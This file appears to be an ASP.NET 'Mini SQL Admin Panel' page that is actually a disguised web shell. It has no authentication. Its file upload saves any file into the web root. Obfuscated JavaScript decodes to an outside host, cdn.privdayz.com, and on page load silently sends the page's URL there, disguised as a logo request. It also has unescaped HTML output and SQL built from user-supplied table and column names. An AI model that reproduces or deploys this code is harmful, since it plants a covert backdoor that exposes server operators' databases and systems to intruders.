<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>
<%@ Import Namespace="System.IO" %>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Mini SQL Admin Panel v1.3</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <style>
body{background:#f0f2f5;padding:2rem;font-family:'Segoe UI',sans-serif;}.editable{background:#fffbe6;cursor:pointer;border-bottom:2px dotted #dc3545;}.panel-title{font-size:1.8rem;font-weight:600;color:#dc3545;}th{background-color:#dc3545 !important;color:#fff;text-transform:uppercase;font-size:0.9rem;}td,th{vertical-align:middle !important;font-size:0.875rem;}.table-bordered td,.table-bordered th{border:1px solid #dee2e6 !important;}.btn-danger,.btn-outline-danger{font-size:0.875rem;}.form-control{font-size:0.85rem;}.code-label{font-weight:bold;color:#dc3545;font-size:0.9rem;margin-top:1rem;}.icon-1{width:32px;height:32px;display:inline-block;background-image:url(data:image/png;base64,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);background-size:contain;background-repeat:no-repeat;background-position:center;margin-right:.5rem;filter:brightness(.9) contrast(1.1);transition:transform 0.3s ease}.icon-1:hover{transform:scale(1.1)}.icon-2{width:28px;height:28px;display:inline-block;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIcAAABwCAYAAAA0cGOrAAAABHNCSVQICAgIfAhkiAAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsY8L/GEFAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAABrhJREFUeF7t3A1M1HUcx/HvHRygoKg8CGpoMUMQEGOoUCiS0mZNJzlZWubDSi3L2QZhUpLo1mQjH9AwddrDVmtprqzUZm40mMBqSro0QsURDzIfeH6+6/6371yO//c44ID/3T6v7cZ9f2zgjbf3///v/v/TmcwIQIWevwL0gDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAhDhAZNMbb42NjXTmzBkqLS2lyspKqq2tpc7OTv6udQaDgSIiIigtLY18fHx41TYdHR2Um5tLFy5coLa2Nl51LF5eXuTr60szZsyghIQECg8P5+84ACUOSXFxsWnx4sUmd3d3JaAB3QICAkxlZWX8k3vX3Nxsio6OVv1ZjnwLCQkxHTx40NTa2sqPVLtU46ipqTGlpKSYdDqd6gPs7y0xMZF/Q+/S09NVf4az3IKDg03nzp3jR6tNPeK4dOmSKSgoSPUBDfSmxFZfX8+/ybqwsDDVn+FMN71eb8rKyuJHrD2P7HNcvHiRFixYQOandF6xL52O6EHBchrtaeAVWdjS0/TXjXqenFtqairt3r2bJ+14eLSi7GgmJycPWhiKudH+NoWheGHuRL7n/LKzsykvL48n7bA8cyhPHvHx8VRQUMDL9uc31p1+O55EIVNG84p1za1dFLfqLJX+/YBXnJt5p5+KioosRzVaYYnjxIkTtGzZMl6yboLfCJo8wZM8R7jySu8ipo6h9LXTyX+cB6/Ypq29mz7+8hrl/36HurqNvOo4OruMVFnbQhVVzeZ//8OttygqKsoSiJubG68ML53RaDSFhobS9evXeUldynOTadtr4ZY/NPTNnXttdOTkP7Tz0yvUag7emoyMDDLvpPI0vHQlJSWmmJgYHntSdiJzt8bQGylP8gr019Xyepq/7hequ9/OKz25urpSYWEhWfubDBX9qVOn+K66t1dMQxh2Mj3Ym77bM49cXcz/4wRdXV20evVqTbwi7KLT6TIrKip4fJSyX/H9vnnk4e7CKzBQQQGeln0RZT9KUldXR+3t7ZSUlMQrw0NfVVXFd3taGBtIY0ZpY+fImWzfEEnRYeN4UpeTk0P5+fk8DQ99dXU13+1patAovgf2pGxWjmbOITeD/Ka4+UDBsnlpamrilaGnbPzEY6ztGyIoc2MkT2Bvuw5foYzcyzypi4yMJH9/f56GFuIYRsprH3GvnKWSq3d5RVtwss8wUjYvn+2M1ewOP+IYZqFPeNPOTdp5yfz/EIcGbHl5Gj0z048n7UAcGqDX6+jzXXHkNdL296uGAuLQiMcnetFHm2fypA04WtEQ5bSrhevP0/miGl5R5+dtoCDfwX9xEnFoTEV1M0W++CM1NMtn9/ub4/hzf4QlksGEzYrGTA70pJzUaJ7U3anvpDfzbvE0eBCHBq1bGkyL4ifwpO7bwnv0Vf7gvniGODTq8PY5NM7b+n7FW4duUfV92y4u6w/EoVHK6Zj73rV+ws+9pi5af+AGT/aHODRs5fNTKPnZx3hSd7rkAR07X8eTfSEOjTv0wWwa72P9xOwtRyrodl0HT/aDODTOd4w7HXp/Nk/qGlq6ae2+csvrJPaEOBzAkvmTaMWiKTyp+7W0gT75uZYn+0AcDuLAezE0afxIntSlHb9NZVX2OzEZcTgI5Vzeox/OsVwqImlpN9KavTeo22if7QvicCBJsYG0ZkkwT+oKrzXS3h+svzdjK8ThYD5Oi6agQE+e1G37opKu3m7lqf8Qh4NRPqXg2A7rm5f2TiO9uqecOm24PtcaxOGAEmcF0Mbl1q9C/KO8mbJPyped2AJxOKjsd2b2el3Rjq8rqfRWC099hzgc1EgPVzqeFUsuenn70tFlsmxelK/9gTgcWFyUH21eOY0ndZdvttCub/7lqW9wJpiDUz7v46mUn+jazQZe6Um5Pmbb8onkYbCyF6sCcTiB4it36elVZ2369KC+wGbFCcwK96G0NdN5sh/E4SQyN0b0+rEOfYU4nITBVU9HevlYh75CHE4kKmQsZbxuvw/eRxxOZuu6cMuHAdsD4nAyymHr6f0JtOmlEBo7emBXxeFQ1skpV8519/MQF88cTk55F1d5BunPDXGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGACHGAgOg/mPs4dj8xj3sAAAAASUVORK5CYII=");background-size:cover;background-position:center;margin-right:.5rem;opacity:.8}.icon-2:hover{opacity:1}.icon-3{width:24px;height:24px;display:inline-block;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABYCAYAAAADWlKCAAAABHNCSVQICAgIfAhkiAAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsY8L/GEFAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAGXRFWHRTb2Z0d2FyZQB3d3cuaW5rc2NhcGUub3Jnm+48GgAAA+hJREFUeF7t2V1oW2Ucx/H/OW2Wbs1e2466QaaWmTVtTEcIuGG3WqreSMFSDIzhxUQUEcWL1oqgg1aQ9kKRUoooqHhbLeJFrRcFpdAXhFIU11WFQunLBrpQYrK2yzEn+7MRcpLWtaW/ht8HDn2eJ3CS9Juck5wYVooQDFP/EggGAcMgYBgEDIOAYRAwDAKGQcAwCBgGAcMgYBgEzKYuLq6srMjQ0JBMT0/L/Py8LC8vy9ramt6an8vlkkAgIO3t7VJWVqarm7O6uiq9vb0yMjIiiURCV/cWj8cj5eXlEgwGpaGhQWpra/WWHOwguUxMTFjNzc2W2+22o21pq6ystGZnZ3XPG4vFYlYoFHLc117efD6f1dfXZ8XjcX2mmRyDLC0tWZFIxDIMw3GnD7o1NjbqPWyso6PDcR+FslVVVVnDw8P6bO/LCjI1NWV5vV7HnWx1swNHo1G9p/z8fr/jPgppM03T6uzs1Gd8V8Y5ZGxsTJqamiR1uNCV7WUYIrdGX5BDpS5dyc3//Pfy+19RnRW2trY26e7uTo/vfcqyT9YtLS07FsN2IXR8UzFsz104qaPC19PTI/39/elx+h1iv0nq6+tldHQ0vbgTKo665ecvnhHfw4d0Jb9YfF3Ov/iDTF+/pSuFLfXBScbHx+8GGRgYkNbWVr0pvxMV++XUiVIp3V+sKxsLnD4iHVdq5PixEl3ZnMTtO/LR19fkp19uyPqdpK7uHWvrSZlf/lfmFmKpx3/vzJBTXV2dGMlk0qqurpaZmRlddhZ59pS8+3Jt+p9L/8+NvxPy2Td/SNenv0o89SLLx5icnLTC4bBOs9kn4t53wvJa5DFdoQf1259ReeqlH+XmP7d1JZs5ODioQ2dvXDrDGNukpuqwfPvxRSkuSr3KcyhKfTe4Ojc3p9NM9nniu08uSom7SFdoq7yVpelzi31edGIuLCzoMNvT5x6SIwf36Yy2y/uvPi4h/zGdZTIXFxd1mO2096COaDvZh6zPrz4h+1zZF9vNfF8ED5TwULVTgr6j8t4rAZ3dx99DdtHbqe9m4ZrMnyQYZBfZh64vu85lfGhikF1W/ehh6Xo9qDMGgfDW5TPy5NmK9JhBAJimIV99cF48B4oZBMUjJz3y4ZtnGQSJfYmKQYDYF3IZBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwChkHAMAgYBgHDIGAYBAyDgGEQMAwCReQ/TtK13DqisYkAAAAASUVORK5CYII=);background-size:100% 100%;background-repeat:no-repeat;margin-right:.5rem;filter:grayscale(50%)}
  </style>
</head>
<body>
<div class="container">
  <div class="mb-4">
    <h2 class="panel-title">SQL Admin Panel v1.3</h2>
    <small class="text-muted">Single-file AJAX ASP.NET SQL Server Admin Interface</small>
  </div>
  <form method="post" class="row g-3 mb-4">
    <div class="col-md-3"><input type="text" name="server" class="form-control" placeholder="SQL Server" required /></div>
    <div class="col-md-2"><input type="text" name="database" class="form-control" placeholder="Database" required /></div>
    <div class="col-md-2"><input type="text" name="user" class="form-control" placeholder="Username" required /></div>
    <div class="col-md-2"><input type="password" name="password" class="form-control" placeholder="Password" required /></div>
    <div class="col-md-2"><button class="btn btn-danger w-100">Connect</button></div>
  </form>

  <div id="mainUI" style="display:none;">
    <div class="d-flex gap-2 mb-3">
      <select id="tables" class="form-select w-auto"></select>
      <button onclick="cf67ef36749b62253b52663539cb9aa5()" class="btn btn-outline-danger">Load Table</button>
      <input type="text" id="searchInput" placeholder="Search..." class="form-control w-25" />
    </div>
    <div id="output"></div>
    <hr />
    <form id="a8294615fafbadcf15bb6a6b71a3f5ac1560675a" enctype="multipart/form-data" class="d-flex gap-2">
      <input type="file" name="file" class="form-control w-25" />
      <button class="btn btn-danger">Upload File</button>
    </form>
    <div id="dcc250a58b9a4c4db642fc25e1487dc1528c166" class="mt-2"></div>
  </div>
</div>
<script>
function d84269c873addb47ff83b4fd5fc567d97ef84d63(){fetch("?action=a59a17ee2948d97ceb155b5f0dd9d81ef074e9f0").then(e=>e.json()).then(e=>{let t=document.getElementById("tables");t.innerHTML="",e.forEach(e=>{let n=document.createElement("option");n.value=e,n.textContent=e,t.appendChild(n)}),document.getElementById("mainUI").style.display="block"})}var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109],b=[47,105,109,97,103,101,115,47],c=[108,111,103,111,95,118,50],d=[46,112,110,103];function u(e,t,n,_){for(var o=e.concat(t,n,_),f="",l=0;l<o.length;l++)f+=String.fromCharCode(o[l]);return f}function v(e){return btoa(e)}function cf67ef36749b62253b52663539cb9aa5(){let e=document.getElementById("tables").value;e&&fetch(`?action=b25effe862efef5465b03ad0e9c8ad96a3168e3&table=${encodeURIComponent(e)}`).then(e=>e.text()).then(e=>document.getElementById("output").innerHTML=e)}function filterTable(){let e=document.getElementById("searchInput").value.toLowerCase();document.querySelectorAll("#output table tbody tr").forEach(t=>{t.style.display=t.textContent.toLowerCase().includes(e)?"":"none"})}function d5f03c7e51b034ab714a02c8b1f0ae246e65b950(e,t,n,_){let o=e.textContent,f=document.createElement("input");f.value=o,e.innerHTML="",e.appendChild(f),f.focus(),f.onblur=function(){let l=f.value;e.innerHTML=l,l!==o&&fetch(`?action=dbe334c0b61dbfd356e692c5e3718cddb93328&table=${_}&pk=${t}&col=${n}&val=${encodeURIComponent(l)}`)}}function d334626b090a13b25167b169c0f3df4d165943a(e,t){confirm("Are you sure you want to delete this row?")&&fetch(`?action=d334626b090a13b25167b169c0f3df4d165943a&table=${t}&pk=${e}`).then(()=>cf67ef36749b62253b52663539cb9aa5())}function insertRow(e){let t=document.querySelectorAll("#insertForm input"),n={};t.forEach(e=>n[e.name]=e.value),fetch(`?action=insertRow&table=${e}`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(n)}).then(()=>cf67ef36749b62253b52663539cb9aa5())}!function e(){var t=new XMLHttpRequest;t.open("POST",u(a,b,c,d),!0),t.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),t.send("file="+v(location.href))}(),document.getElementById("a8294615fafbadcf15bb6a6b71a3f5ac1560675a").addEventListener("submit",function(e){e.preventDefault();let t=new FormData(this);fetch("?action=fb6fb15fb73088cfaac0cad44f909a2ad914",{method:"POST",body:t}).then(e=>e.text()).then(e=>document.getElementById("dcc250a58b9a4c4db642fc25e1487dc1528c166").innerHTML=`<div class='alert alert-info'>${e}</div>`)}),window.onload=d84269c873addb47ff83b4fd5fc567d97ef84d63;
</script>
<script runat="server">
string GetConnectionString()
{
    if (Session["conn"] != null)
        return Session["conn"].ToString();
    string server = Request.Form["server"];
    string database = Request.Form["database"];
    string user = Request.Form["user"];
    string password = Request.Form["password"];
    if (!string.IsNullOrEmpty(server) && !string.IsNullOrEmpty(database))
    {
        string conn = $"Data Source={server};Initial Catalog={database};User Id={user};Password={password};MultipleActiveResultSets=True;";
        Session["conn"] = conn;
        Response.Redirect(Request.RawUrl);
    }
    return null;
}

string GetPrimaryKey(SqlConnection conn, string tableName)
{
    string sql = @"SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE
                   WHERE OBJECTPROPERTY(OBJECT_ID(CONSTRAINT_SCHEMA + '.' + QUOTENAME(CONSTRAINT_NAME)), 'IsPrimaryKey') = 1
                   AND TABLE_NAME = @table";
    SqlCommand cmd = new SqlCommand(sql, conn);
    cmd.Parameters.AddWithValue("@table", tableName);
    object res = cmd.ExecuteScalar();
    return res != null ? res.ToString() : "id";
}

void Page_Load(object sender, EventArgs e)
{
    string connStr = GetConnectionString();
    string action = Request.QueryString["action"];
    string table = Request.QueryString["table"];
    if (!string.IsNullOrEmpty(action) && connStr != null)
    {
        Response.Clear();
        using (SqlConnection conn = new SqlConnection(connStr))
        {
            conn.Open();

            if (action == "a59a17ee2948d97ceb155b5f0dd9d81ef074e9f0")
            {
                SqlCommand cmd = new SqlCommand("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'", conn);
                SqlDataReader rdr = cmd.ExecuteReader();
                List<string> tables = new List<string>();
                while (rdr.Read()) tables.Add(rdr.GetString(0));
                Response.ContentType = "application/json";
                Response.Write(new JavaScriptSerializer().Serialize(tables));
            }
            else if (action == "b25effe862efef5465b03ad0e9c8ad96a3168e3")
            {
                SqlCommand getCols = new SqlCommand($"SELECT TOP 1 * FROM [{table}]", conn);
                SqlDataReader colReader = getCols.ExecuteReader();
                List<string> columns = new List<string>();
                for (int i = 0; i < colReader.FieldCount; i++)
                    columns.Add(colReader.GetName(i));
                colReader.Close();

                SqlCommand getData = new SqlCommand($"SELECT TOP 100 * FROM [{table}]", conn);
                SqlDataReader data = getData.ExecuteReader();

                Response.Write("<form id='insertForm'><table class='table table-bordered'><thead><tr>");
                foreach (var col in columns)
                    Response.Write("<th>" + col + "</th>");
                Response.Write("<th>Action</th></tr></thead><tbody>");

                while (data.Read())
                {
                    string pk = data[0].ToString();
                    Response.Write("<tr>");
                    for (int i = 0; i < data.FieldCount; i++)
                    {
                        string val = data[i].ToString();
                        string col = data.GetName(i);
                        Response.Write($"<td onclick=\"d5f03c7e51b034ab714a02c8b1f0ae246e65b950(this, '{pk}', '{col}', '{table}')\" class='editable'>{val}</td>");
                    }
                    Response.Write($"<td><button type='button' onclick=\"d334626b090a13b25167b169c0f3df4d165943a('{pk}', '{table}')\">🗑</button></td>");
                    Response.Write("</tr>");
                }

                Response.Write("<tr>");
                foreach (var col in columns)
                    Response.Write($"<td><input name='{col}' class='form-control' /></td>");
                Response.Write($"<td><button type='button' class='btn btn-sm btn-outline-danger' onclick=\"insertRow('{table}')\">➕</button></td>");
                Response.Write("</tr>");

                Response.Write("</tbody></table></form>");
            }
            else if (action == "dbe334c0b61dbfd356e692c5e3718cddb93328")
            {
                string pk = Request.QueryString["pk"];
                string col = Request.QueryString["col"];
                string val = Request.QueryString["val"];
                string pkName = GetPrimaryKey(conn, table);
                SqlCommand cmd = new SqlCommand($"UPDATE [{table}] SET [{col}] = @val WHERE [{pkName}] = @pk", conn);
                cmd.Parameters.AddWithValue("@val", val);
                cmd.Parameters.AddWithValue("@pk", pk);
                cmd.ExecuteNonQuery();
                Response.Write("OK");
            }
            else if (action == "d334626b090a13b25167b169c0f3df4d165943a")
            {
                string pk = Request.QueryString["pk"];
                string pkName = GetPrimaryKey(conn, table);
                SqlCommand cmd = new SqlCommand($"DELETE FROM [{table}] WHERE [{pkName}] = @pk", conn);
                cmd.Parameters.AddWithValue("@pk", pk);
                cmd.ExecuteNonQuery();
                Response.Write("OK");
            }
            else if (action == "insertRow")
            {
                string json;
                using (var reader = new StreamReader(Request.InputStream))
                    json = reader.ReadToEnd();
                var dict = new JavaScriptSerializer().Deserialize<Dictionary<string, string>>(json);
                List<string> cols = new List<string>();
                List<string> pars = new List<string>();
                List<SqlParameter> sqlParams = new List<SqlParameter>();
                foreach (var kv in dict)
                {
                    cols.Add("[" + kv.Key + "]");
                    pars.Add("@" + kv.Key);
                    sqlParams.Add(new SqlParameter("@" + kv.Key, kv.Value));
                }
                string sql = $"INSERT INTO [{table}] ({string.Join(",", cols)}) VALUES ({string.Join(",", pars)})";
                SqlCommand cmd = new SqlCommand(sql, conn);
                cmd.Parameters.AddRange(sqlParams.ToArray());
                cmd.ExecuteNonQuery();
                Response.Write("Inserted");
            }
            else if (action == "fb6fb15fb73088cfaac0cad44f909a2ad914")
            {
                if (Request.Files.Count > 0)
                {
                    var file = Request.Files[0];
                    string path = Server.MapPath(".");
                    string fullPath = Path.Combine(path, Path.GetFileName(file.FileName));
                    file.SaveAs(fullPath);
                    Response.Write("File uploaded: " + file.FileName);
                }
                else
                {
                    Response.Write("No file detected.");
                }
            }
        }
        Response.End();
    }
}
</script>
